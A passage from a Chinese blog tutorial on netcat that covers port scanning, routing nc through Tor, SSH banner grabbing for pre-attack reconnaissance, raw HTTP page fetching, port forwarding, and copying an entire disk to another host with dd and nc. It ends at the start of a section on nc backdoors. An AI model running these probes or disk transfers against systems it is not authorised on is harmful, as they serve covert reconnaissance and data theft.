<h3 id="◇补充说明：优化输出"><a href="#◇补充说明：优化输出" class="headerlink" title="◇补充说明：优化输出"></a>◇补充说明：优化输出</h3><p>　　玩“端口扫描”的时候，“<code>-v</code> 选项”会把“成功/失败”的结果统统打印出来。<br>　　通常大伙儿关注的都是“扫描成功”的那些端口。因此，可以用如下命令过滤一下，只打印扫出来的端口。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -znv x.x.x.x <span class="hljs-number">1</span>-<span class="hljs-number">1024</span>  <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | grep succeeded<br></code></pre></td></tr></table></figure>
<p>　　由于“<code>-v</code> 选项”产生的输出位于【stderr】，上述命令中的 <code>2&gt;&amp;1</code> 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）<br><code>grep</code> 命令用来进行【过滤】。对于 Windows 系统，默认【没有】<code>grep</code> 命令，需改用 <code>find</code> 命令过滤。</p>
<h3 id="◇补充说明：超时设置-1"><a href="#◇补充说明：超时设置-1" class="headerlink" title="◇补充说明：超时设置"></a>◇补充说明：超时设置</h3><p>　　如果你要扫描的端口范围，跨度比较大，超时值要【恰到好处】——<br>超时值太大，会浪费时间；超时值太小，可能会遗漏某些端口（端口本身开放，但 nc 还没来得及连上就超时了）<br>　　具体如何设置，参见“招数1”的“补充说明”。</p>
<h3 id="◇补充说明：【并发】扫描"><a href="#◇补充说明：【并发】扫描" class="headerlink" title="◇补充说明：【并发】扫描"></a>◇补充说明：【并发】扫描</h3><p>　　如果你设置了较小的超时值，依然嫌慢，还可以用【并发】扫描的方式，进一步提升效率。<br>　　简而言之就是：同时运行多个 nc，分别扫描不同的端口范围。</p>
<h2 id="★招数4：（隐匿性）如何让-nc-走暗网（以-Tor-为例）"><a href="#★招数4：（隐匿性）如何让-nc-走暗网（以-Tor-为例）" class="headerlink" title="★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）"></a>★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）</h2><h3 id="◇使用场景-3"><a href="#◇使用场景-3" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　如果你想用 nc 干一些“不为人知”的事情，首先要考虑的是——如何消除【网络层面】的踪迹。<br>　　最容易想到的当然就是——让 nc 走暗网（比如 Tor）。本文以下部分称之为【nc over Tor】。<br>　　顺便说一下：“原版 nc”【不支持】代理，而 nc 的“OpenBSD 变种”支持各种代理。这是两种 nc 之间的关键性差异之一。</p>
<h3 id="◇方法-3"><a href="#◇方法-3" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　为了支持代理，nc 的“OpenBSD 变种”增加了两个选项：<code>-X</code> 与 <code>-x</code></p>
<p><strong>选项 <code>-x</code></strong><br>　　该选项表示【代理的位置】，以 <code>x.x.x.x:xxx</code> 的形式表示（中间是【半角冒号】）。</p>
<p><strong>选项 <code>-X</code></strong><br>　　该选项表示【代理的类型】，含义如下：</p>
<table>
<thead>
<tr>
<th>选项值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>5</td>
<td>SOCKS5 代理</td>
</tr>
<tr>
<td>4</td>
<td>SOCKS4 代理</td>
</tr>
<tr>
<td>connect</td>
<td>CONNECT 型的 HTTP 代理</td>
</tr>
</tbody></table>
<p>　　首先，确保你本机已经运行了 Tor；<br>　　然后，拿俺的域名测试一下。如果 nc 的输出中包含 <code>succeeded</code>（参见下面的第2行），说明 OK 啦——nc 已经能通过 Tor 联网。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-X</span> 5 <span class="hljs-selector-tag">-x</span> 127.0.0.1<span class="hljs-selector-pseudo">:9050</span> <span class="hljs-selector-tag">-q</span> 3 <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">program-think</span><span class="hljs-selector-class">.blogspot</span><span class="hljs-selector-class">.com</span> 443<br><br><span class="hljs-selector-tag">Connection</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">program-think</span><span class="hljs-selector-class">.blogspot</span><span class="hljs-selector-class">.com</span> 443 <span class="hljs-selector-tag">port</span> <span class="hljs-selector-attr">[tcp/https]</span> <span class="hljs-selector-tag">succeeded</span>!<br></code></pre></td></tr></table></figure>
<p>（注：如果你用的是“Tor Browser”，上述命令中的“<code>-x</code> 选项值”改为 <code>127.0.0.1:9150</code>）</p>
<h3 id="◇补充说明：延时退出"><a href="#◇补充说明：延时退出" class="headerlink" title="◇补充说明：延时退出"></a>◇补充说明：延时退出</h3><p>　　在上述举例中，俺用到了一个新的 <code>-q</code> 选项。主要考虑到：本博客的 Web Server 位于【公网】。<br>　　当你用 nc 连接【公网】上的服务器，因为【公网】的传输质量会受到诸多因素的影响，最好加 <code>-q</code> 选项，让 nc【延时】退出。<br>　　在俺的示例中，延时3秒。实际操作时，要根据你的网络环境调整。</p>
<h3 id="◇补充说明：Tor-暗网的好处"><a href="#◇补充说明：Tor-暗网的好处" class="headerlink" title="◇补充说明：Tor 暗网的好处"></a>◇补充说明：Tor 暗网的好处</h3><p>　　关于 Tor 的用处/好处，俺在博客上重复唠叨的次数，已经数不清了。<br>　　（简而言之）由于 Tor 暗网的线路会经历“三级跳”＆“三重套”，而且其线路每隔10分钟就会【随机】变换一次。这种变态的玩法，可以让【网络层面】的逆向追溯变得非常非常困难。</p>
<h3 id="◇补充说明：域名解析"><a href="#◇补充说明：域名解析" class="headerlink" title="◇补充说明：域名解析"></a>◇补充说明：域名解析</h3><p>　　当你用刚才的招数做到【nc over Tor】之后，一旦 nc 的网络行为需要解析域名，会自动通过 Tor 的 SOCKS 代理进行【远程域名解析】。<br>　　也就是说，“DNS 协议”相关数据流也经过 Tor 暗网——这样既可以【防止】“域名解析”暴露你的网络行为，还可以避免 GFW 的“域名污染”。</p>
<h3 id="◇补充说明：设置别名（alias）"><a href="#◇补充说明：设置别名（alias）" class="headerlink" title="◇补充说明：设置别名（alias）"></a>◇补充说明：设置别名（alias）</h3><p>　　如果你比较懒，觉得每次都输入上述两个代理选项太麻烦，可以为 nc 设置一个【别名】（命令如下）</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">alias nc-tor=&#x27;nc -X 5 -x 127.0.0.1:<span class="hljs-number">9050</span>&#x27;<br></code></pre></td></tr></table></figure>
<p>　　设置好之后，你只要用 <code>nc-tor</code> 就可以自动追加代理选项。<br>　　如果想让别名【永久】生效，要把上述命令加入到：你当前使用的 shell 的启动文件中。<br>　　再次唠叨：“裸 Tor”与“Tor Browser”的监听端口有差异。俺上述命令的 <code>9050</code> 是用于“裸 Tor”。</p>
<h2 id="★招数5：（信息收集）用-nc-探测“服务器类型”和“软件版本”（以-SSH-为例）"><a href="#★招数5：（信息收集）用-nc-探测“服务器类型”和“软件版本”（以-SSH-为例）" class="headerlink" title="★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）"></a>★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）</h2><h3 id="◇使用场景-4"><a href="#◇使用场景-4" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　入侵者在发起攻击之前，有一个很重要的步骤叫做【信息收集】。攻击者对目标了解得越多，得手的机会就越大。<br>　　下面俺以 SSH Server（sshd）举例。</p>
<h3 id="◇方法-4"><a href="#◇方法-4" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　如今要【远程管理】服务器，最常用的大概就是 SSH 这种方式了。<br>　　如果某个服务器运行了 SSH 服务端（默认监听端口是 <code>22</code>），那么用如下命令可以看出：该服务器的操作系统类型，以及 SSH server 的版本。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP <span class="hljs-number">22</span><br><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>

<p><strong>选项 <code>-v</code></strong><br>　　玩这招时，最好加 <code>-v</code> 选项——nc 会先显示“端口已经连上”或者“端口连不上”。</p>
<p><strong>选项 <code>-q</code></strong><br>　　（关于该选项的说明，参见“招数4”章节的【延时退出】）</p>
<p><strong><code>nc-tor</code> 别名</strong><br>　　（关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理）</p>
<p>　　前面聊了这么久，一直没有给出【实例】。现在来一个【真实的】例子——用 nc 探测 Github 的 SSH 端口<br>　　（注：在如下终端窗口中，头一行是命令，后面两行是输出）</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> ssh.github.<span class="hljs-keyword">com</span> <span class="hljs-number">22</span><br><br>Connection <span class="hljs-keyword">to</span> ssh.github.<span class="hljs-keyword">com</span> <span class="hljs-number">22</span> port [tcp/ssh] succeeded!<br>SSH-<span class="hljs-number">2.0</span>-babeld-dae25663<br></code></pre></td></tr></table></figure>


<h3 id="◇补充说明：echo-命令"><a href="#◇补充说明：echo-命令" class="headerlink" title="◇补充说明：echo 命令"></a>◇补充说明：echo 命令</h3><p>　　上述用到的 <code>echo</code> 命令是 POSIX 下常用的命令。Windows 的命令行中也有同名的命令，但功能/用法有【差异】。</p>
<h3 id="◇补充说明：批处理-＆-自动化"><a href="#◇补充说明：批处理-＆-自动化" class="headerlink" title="◇补充说明：批处理 ＆ 自动化"></a>◇补充说明：批处理 ＆ 自动化</h3><p>　　某些“有心人”甚至可以搞一个脚本，批量探测某个 IP 地址段的 22 端口，然后把找到的服务器信息保存在某个文件中。<br>　　另外，<br>　　有的系统管理员会把 sshd 的监听端口从 <code>22</code> 改为其它数值，想要迷惑攻击者。但这么干，【效果不大】。<br>　　攻击者可以先进行端口扫描，拿到所有已开启的 TCP 监听端口；然后利用上述方法，对这些 TCP 端口进行【自动化】探测，从而判断出哪个端口是 SSH Server。</p>
<h3 id="◇补充说明：防范措施"><a href="#◇补充说明：防范措施" class="headerlink" title="◇补充说明：防范措施"></a>◇补充说明：防范措施</h3><p>　　本章节以“SSH Server”举例来说明入侵者如何探测服务端的软件版本。<br>　　除了“SSH Server”，很多其它的服务端软件，也存在类似的【信息暴露】。<br>　　一个谨慎的系统管理员，应该通过定制，【消除 or 伪造】这些信息，从而增加入侵者的攻击成本。</p>
<h2 id="★招数6：（隐匿性）用-nc-实现【彻底无痕】的-Web-访问"><a href="#★招数6：（隐匿性）用-nc-实现【彻底无痕】的-Web-访问" class="headerlink" title="★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问"></a>★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问</h2><h3 id="◇使用场景-5"><a href="#◇使用场景-5" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　有时候，俺想要看某个 Web 服务器上的某个页面的内容，但是又【不希望】在那上面留下俺本人的任何痕迹。这里所说的“痕迹”既包括【网络】层面滴，也包括【操作系统 ＆ 软件】层面滴。<br>　　要搞定【网络】层面，很简单——主要靠【暗网】（Tor or I2P），来掩盖你的【真实】“公网 IP”。具体的玩法，前面章节已经聊过啦。<br>　　要搞定【操作系统 ＆ 软件】层面，稍微麻烦一点。如果你用传统的浏览器（Chrome、Firefox、IE、Edge …）访问了某个页面。即使你禁用了 JS，伪造了浏览器的“User Agent”。但如果 Web 服务器想要收集你的系统指纹，还是有若干办法——可以通过浏览器的一些差异，获得某些信息量（安全行话叫做“浏览器指纹”）。<br>　　比如说：HTTP 协议的【Header】字段可能会包含某些信息。<br>　　比如说：不同内核的浏览器，对页面的渲染会有差异。对页面中的【外部】元素（图片、JS、CSS …）的加载效率也会有差异。<br>　　比如说：即使同一款浏览器，在不同系统平台上，依然会表现出某些差异。<br>　　……</p>
<p>　　此时，nc 再度派上用场——你可以用 nc 直接抓取页面，保存到本机。<br>　　这种玩法相当于——让 nc 在【裸 TCP】层面执行 HTTP 协议的命令。在整个过程中，浏览器完全【不】参与其中。既【不会】暴露浏览器的信息，也【不会】暴露操作系统的信息。</p>
<h3 id="◇方法-5"><a href="#◇方法-5" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　先执行下列两个命令的其中一个（具体看你想用“IP”还是“域名”）</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 端口<br>echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP 端口<br></code></pre></td></tr></table></figure>

<p>　　然后 nc 就会把这个页面抓下来，打印到命令行终端。这时候你看到的是【HTML 源代码】。</p>
<p>　　上述命令访问的是 Web Server 的【根路径】。如果你想要看其它路径的页面（比如说：<code>/index.html</code>），稍微修改成如下：</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /index.html HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 端口<br>echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /index.html HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP 端口<br></code></pre></td></tr></table></figure>

<p>　　由于正常人类是无法直接阅读【HTML 源代码】滴。为了更加人性化，你可以把 nc 抓下来的 HTML 源代码，（在命令行中用“大于号”）重定向到某个 HTML 文件，然后就可以用你本机的浏览器阅读之。</p>
<p><strong><code>nc-tor</code> 别名</strong><br>　　（关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理）</p>
<p><strong>选项 <code>-q</code></strong><br>　　（关于该选项的说明，参见“招数4”章节的【延时退出】）</p>
<h3 id="◇补充说明：HTTP-协议"><a href="#◇补充说明：HTTP-协议" class="headerlink" title="◇补充说明：HTTP 协议"></a>◇补充说明：HTTP 协议</h3><p><strong>协议版本</strong><br>　　有些同学会奇怪——为啥俺上述的示例用的是 1.0 而不是 1.1？<br>　　主要是为了偷懒——按照 RFC 的规范，HTTP 1.1 的 Request 中，<code>Host</code> 是【必须】的字段；而在 HTTP 1.0 中，这个字段是【可选】滴。</p>
<p><strong>HTTPS</strong><br>　　nc 的“OpenBSD 变种”还【不】支持 HTTPS（SSL/TLS）。<br>　　在本文末尾介绍的其它变种里面，ncat ＆ socat 已经完全支持 SSL/TLS 协议。<br>　　由于本文主要介绍 nc 的“OpenBSD 变种”，关于 ncat ＆ socat 的话题，就不展开啦。</p>
<h3 id="◇补充说明：这种方式的【缺点】"><a href="#◇补充说明：这种方式的【缺点】" class="headerlink" title="◇补充说明：这种方式的【缺点】"></a>◇补充说明：这种方式的【缺点】</h3><p><strong>关于“页面的【外部】元素”</strong><br>　　用这招，nc 只抓取页面本身，不包括页面中的外部元素（图片、JS、CSS …）。<br>　　这种方式拿到的页面，阅读的时候会显得比较丑陋（你就凑合着看吧）</p>
<p><strong>关于“JS 引擎”</strong><br>　　由于这招只是在 TCP 层面模拟了简单的 HTTP 协议。所以只能得到【静态 HTML】。<br>　　如果某个页面的内容是依靠【前端 JS】动态生成（所谓的 AJAX 风格），那这招就不灵啦（因为 nc【没有】JS 引擎）。</p>
<h2 id="★招数7：（网络配置）基于-nc-的端口转发（Port-Forward）"><a href="#★招数7：（网络配置）基于-nc-的端口转发（Port-Forward）" class="headerlink" title="★招数7：（网络配置）基于 nc 的端口转发（Port Forward）"></a>★招数7：（网络配置）基于 nc 的端口转发（Port Forward）</h2><h3 id="◇使用场景-6"><a href="#◇使用场景-6" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　关于【端口转发】的相关概念，有啥用处和好处，那篇都已经写了。这里就不再重复唠叨啦。<br>　　在当年那篇教程中，俺主要聊了两个工具，分别是是 rinetd 和 netsh。当年为啥没有介绍 netcat 捏？因为 nc 的功能太强，所谓“杀鸡焉用牛刀”。相比之下，rinetd 的使用非常简单，而 netsh 是 Windows 内置滴工具。<br>　　今天就把当年没聊的给补一下——如何用 nc 玩“端口转发”。</p>
<h3 id="◇原理"><a href="#◇原理" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。<br>　　玩过命令行的同学，应该都知道：大部分 shell 都支持【管道符】（就是那个竖线符号 <code>|</code>），可以把某个进程的标准输出，重定向给另一个进程的标准输入。但是 shell 的“管道符”只能做到“单向配对”，【无法】做到“交叉配对”。所以还需要再借助另一个管道——也就是“命名管道”。<br>　　“命名管道”洋文叫做“named pipe”，是一种进程间通讯（IPC）的机制。顾名思义，“命名管道”就是有名号滴，而 shell 中使用的那个【管道符】，其本质上是“匿名管道”（无名管道）。<br>　　主流的操作系统（Windows、Linux、UNIX）都支持“命名管道”这种机制。由于俺本人的环境是 Linux，下面只以 Linux 举例。</p>
<h3 id="◇方法-6"><a href="#◇方法-6" class="headerlink" title="◇方法"></a>◇方法</h3><p><strong>步骤1：创建命名管道</strong><br>　　用下面这个简单的命令创建一个“命名管道”，其名称叫做 <code>nc_pipe</code>。（俺用这个名称只是为了举例，你也可以用别的名称）</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">mkfifo nc_pipe</span><br></code></pre></td></tr></table></figure>

<p><strong>步骤2：同时启动两个 nc</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">1234</span> &lt; nc_pipe | nc <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">5678</span> &gt; nc_pipe<br></code></pre></td></tr></table></figure>
<p>　　运行上述命令之后，就可以把本机的 <code>1235</code> 端口重定向到本机的 <code>5678</code> 端口。</p>
<p>　　这个命令有点复杂。技术菜鸟如果看不懂，就算了（没关系滴，不影响你看后续的章节）。<br>　　如果你比较喜欢刨根问底，俺稍微解释一下：<br>　　上述命令行中，前一个 nc 充当【服务端】，后一个 nc 充当【客户端】。命令行中的“管道符”使得“服务端 nc”的输出绑定到“客户端 nc”的输入。然后再用 <code>nc_pipe</code> 这个命名管道做中转，使得“客户端 nc”的输出绑定到“服务端 nc”的输入。从而完成了【交叉配对】。</p>
<h3 id="◇补充说明：如何让-nc-的监听端口【持续开启】-1"><a href="#◇补充说明：如何让-nc-的监听端口【持续开启】-1" class="headerlink" title="◇补充说明：如何让 nc 的监听端口【持续开启】"></a>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><p>　　参见“招数2”章节中的“补充说明”。</p>
<h2 id="★招数8：（网络配置）基于-nc-的代理转发（Proxy-Forward）"><a href="#★招数8：（网络配置）基于-nc-的代理转发（Proxy-Forward）" class="headerlink" title="★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）"></a>★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）</h2><h3 id="◇使用场景-7"><a href="#◇使用场景-7" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　提醒一下：<br>　　【不要混淆】本章节与“招数4”。<br>　　“招数4”聊的是——nc 自己通过代理进行网络访问（nc over Tor）。<br>　　“本章节”聊的是——nc 帮助其它网络软件走代理进行网络访问（XX软件 over nc over Tor）。</p>
<p>　　比如说，SSH 是很常用的一个安全工具——用来远程操作服务器。<br>　　在某些特殊场合，俺想要通过 SSH 登录某个服务器，但是又【不希望】服务器记录俺本人【真实的】“公网 IP”（“暴露【真实的】公网 IP”等同于“暴露真实身份”）<br>　　说到这里，很多老读者肯定猜到俺说啥——让 SSH 走 Tor 代理（SSH over Tor）。<br>　　但可惜的是：（POSIX 系统中常用的）OpenSSH 客户端【不支持】SOCKS 代理，而 Tor 默认提供的是 SOCKS 代理。这时候，netcat 就派上用场啦——用 nc 把 SSH 的数据流转发到 Tor 的 SOCKS 代理。</p>
<h3 id="◇方法-7"><a href="#◇方法-7" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　由于 Github 同时提供了几种不同的访问途径（Web、Git、SSH）。对【每一种】Github 的访问方式，俺都介绍了相应的隐匿措施。<br>　　对 SSH 这种访问方式，当时俺介绍的招数就是——用 nc 进行代理转发（把 SSH 的数据流转发到 Tor）<br>　　既然当年已经聊过了，这里就不重复唠叨啦。对这招感兴趣的同学，请猛击上述链接。</p>
<h3 id="◇补充说明：“SSH-over-Tor”与“Tor-over-SSH”"><a href="#◇补充说明：“SSH-over-Tor”与“Tor-over-SSH”" class="headerlink" title="◇补充说明：“SSH over Tor”与“Tor over SSH”"></a>◇补充说明：“SSH over Tor”与“Tor over SSH”</h3><p>　　即使懂技术的同学，有时候也会混淆这两者。俺顺便澄清一下：</p>
<p><strong>Tor over SSH</strong><br>　　这种方式相当于 SSH 作为 Tor 的前置代理。假设你有一个墙外的 SSH server，而且没有被 GFW 屏蔽，就可以用这招，让你的 Tor 客户端通过这个 SSH server 联网。</p>
<p><strong>SSH over Tor</strong><br>　　这是让 SSH 通过 Tor 网络（暗网）连接到 SSH 服务器，从而隐藏 SSH 客户端的【真实】公网 IP。在这种情况下，SSH 服务器看到的访问者 IP 是“Tor 出口节点的公网 IP”。</p>
<h2 id="★招数9：（系统管理）用-nc-传输文件"><a href="#★招数9：（系统管理）用-nc-传输文件" class="headerlink" title="★招数9：（系统管理）用 nc 传输文件"></a>★招数9：（系统管理）用 nc 传输文件</h2><h3 id="◇使用场景-8"><a href="#◇使用场景-8" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　有时候，你需要在两台电脑之间传输文件。也可以用 nc 搞定。<br>　　俺猜到某些技术小白会问：为啥不用 Windows 的共享目录？<br>　　反驳的理由很多——<br>反驳1：这个玩意儿只能在 Windows 上用。<br>反驳2：为了使用“共享目录”，需要启用（Enable）系统中的好几个 service，这会增加你系统的【攻击面】。<br>反驳3：启用的 service 越多，占用的内容也越多，影响性能。<br>……<br>　　还有些同学会问：为啥不用 FTP、SSH（或诸如此类的东东）？<br>　　俺觉得：<br>1、如果只是临时传一个文件，还要额外再去装某某软件的客户端/服务端，岂不是很蛋疼？<br>2、任何服务端软件，（从某种意义上说）都是在【增加攻击面】。</p>
<h3 id="◇方法-8"><a href="#◇方法-8" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　为了叙述方便，假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2</p>
<p>　　你先在【接收端】（B 主机）运行如下命令（其中的 <code>xxx</code> 是端口号）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p xxx &gt; file<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>　　然后在【发送端】（A 主机）运行如下命令。</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx &lt; file1<br></code></pre></td></tr></table></figure>
<p>　　第二条命令中的 <code>xxx</code> 是端口号，要与第一条命令中的端口号相同；第二条命令中的 <code>x.x.x.x</code> 是【主机 B】的 IP 地址。</p>
<h3 id="◇补充说明：nc-的性能优势"><a href="#◇补充说明：nc-的性能优势" class="headerlink" title="◇补充说明：nc 的性能优势"></a>◇补充说明：nc 的性能优势</h3><p>　　用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。<br>　　（不熟悉网络分层的同学，再去复习一下本文开头的 OSI 模型）<br>　　如果你传输的文件【超级大】或者文件数量【超级多】，用 nc 传输文件的性能优势会很明显（相比“FTP、SSH、共享目录…”而言）</p>
<h2 id="★招数10：（系统管理）用-nc-远程备份整个磁盘"><a href="#★招数10：（系统管理）用-nc-远程备份整个磁盘" class="headerlink" title="★招数10：（系统管理）用 nc 远程备份整个磁盘"></a>★招数10：（系统管理）用 nc 远程备份整个磁盘</h2><h3 id="◇使用场景-9"><a href="#◇使用场景-9" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　当你学会“用 nc 传输文件”，还可以用 nc【复制整个硬盘】。<br>　　无论是对“系统管理员”，还是对“入侵者”甚至是“数据取证人员”，这招都是蛮有用滴。</p>
<p>　　考虑到某些读者是“技术菜鸟”，俺稍微说明一下。<br>　　“磁盘复制”【不同于】“在两块磁盘之间复制文件”。两者之间有很多差别，至少包括：<br><strong>性能差异</strong>——如果“源盘”上有非常多的小文件，“在两块磁盘之间复制文件”就会【非常慢】。<br><strong>完整性差异</strong>——“磁盘复制”可以确保两块盘的内容是完全一致滴。而如果你仅仅在两块磁盘之间复制文件，很多信息都损失掉了。<br>　　一般来说，“系统管理员”和“入侵者”更看重第1个差异（性能）；而“数据取证人员”更看重第2个差异（完整性）。</p>
<h3 id="◇原理-1"><a href="#◇原理-1" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　为了传输整个磁盘，你需要用到 <code>dd</code> 命令。这玩意儿源自 UNIX，后来也移植到 Linux 和 Windows。<br>　　关于 <code>dd</code> 命令的更详细介绍，可以参见“维基百科”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Dd_(Unix)">这里</a>）或“Gnu 官网”（<a target="_blank" rel="noopener" href="https://www.gnu.org/software/coreutils/dd">这里</a>）。</p>
<p>　　通过 <code>dd</code> 命令，你可以把“整个硬盘”（或者硬盘上的某个“物理分区”、“逻辑分区”）dump 成一个文件。<br>　　在本章节，由于最终目的是要【跨主机备份磁盘】，所以并【不】需要真的把 <code>dd</code> 命令的输出保存成文件，而是把 <code>dd</code> 的输出通过管道符（<code>|</code>）重定向给【本机】的 nc，然后让【本机】的 nc 发送到另一台主机的 nc（参见前一个招数）。</p>
<h3 id="◇方法-9"><a href="#◇方法-9" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　由于操作物理磁盘会涉及到操作系统的差异，下面俺以 Linux 举例。<br>　　假设你要把 A 主机 <code>/dev/sda</code> 磁盘的【原始数据】整个复制到 B 主机的 <code>/dev/sdb</code> 磁盘。</p>
<p>　　你先在【接收端】（B 主机）运行如下命令（其中的 <code>xxx</code> 是端口号）</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">nc -l -p xxx | dd of=<span class="hljs-regexp">/dev/</span>sdb<br></code></pre></td></tr></table></figure>

<p>　　然后在【发送端】（A 主机）运行如下命令。</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">dd <span class="hljs-keyword">if</span>=/dev/sda | nc <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx<br></code></pre></td></tr></table></figure>
<p>　　第二条命令中的 <code>xxx</code> 是端口号，要与第一条命令中的端口号相同；第二条命令中的 <code>x.x.x.x</code> 是【主机 B】的 IP 地址。</p>
<h3 id="◇补充说明：nc-的性能优势-1"><a href="#◇补充说明：nc-的性能优势-1" class="headerlink" title="◇补充说明：nc 的性能优势"></a>◇补充说明：nc 的性能优势</h3><p>　　如今的存储设备越来越大了。“磁盘”或者“分区”，动不动都是几百个 GB，这时候 nc 的【性能优势】就体现出来啦。<br>　　（具体的原因，前一个章节已经分析过了）</p>
<h2 id="★招数11：（入侵手法）用-nc-开启【被动】连接型后门"><a href="#★招数11：（入侵手法）用-nc-开启【被动】连接型后门" class="headerlink" title="★招数11：（入侵手法）用 nc 开启【被动】连接型后门"></a>★招数11：（入侵手法）用 nc 开启【被动】连接型后门</h2><p>　　既然聊 netcat，很自然地会聊到“黑客/骇客”的入侵招数。<br>　　做这方面的介绍，并【不是】为了传授入侵技巧；而是为了——让那些注重安全性的同学，能做到“知己知彼”。</p>
